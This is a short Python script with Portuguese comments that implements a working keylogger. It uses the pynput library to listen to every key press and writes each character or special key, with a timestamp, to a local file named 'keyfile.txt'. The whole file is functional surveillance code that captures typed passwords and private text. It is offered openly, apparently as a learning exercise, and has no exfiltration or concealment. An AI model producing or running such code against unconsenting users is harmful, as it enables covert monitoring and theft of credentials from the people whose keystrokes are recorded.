from pynput import keyboard  # Importa o módulo 'keyboard' da biblioteca 'pynput' para monitorar eventos do teclado
import logging  # Importa o módulo 'logging' para registrar eventos em um arquivo

# Configura o logger para escrever no arquivo "keyfile.txt"
logging.basicConfig(
    filename="keyfile.txt",  # Nome do arquivo onde os logs serão salvos
    level=logging.DEBUG,  # Define o nível de registro como DEBUG, capturando todos os níveis de log
    format="%(asctime)s: %(message)s"  # Formato da mensagem de log incluindo o timestamp
)

def keyPressed(key):
    try:
        # Verifica se a tecla tem o atributo 'char' e não é None
        if hasattr(key, 'char') and key.char:
            # Registra a tecla pressionada no arquivo de log
            logging.info(str(key.char))
        else:
            # Se a tecla não tiver um char (teclas especiais), registra o nome da tecla
            logging.info(str(key))
    except AttributeError as e:
        # Registra qualquer erro ao tentar acessar 'char'
        logging.error(f"Erro ao obter char: {e}")

if __name__ == "__main__":
    # Inicia o listener do teclado usando o gerenciador de contexto 'with'
    with keyboard.Listener(on_press=keyPressed) as listener:
        # Mantém o programa em execução para ouvir eventos de teclado
        listener.join()
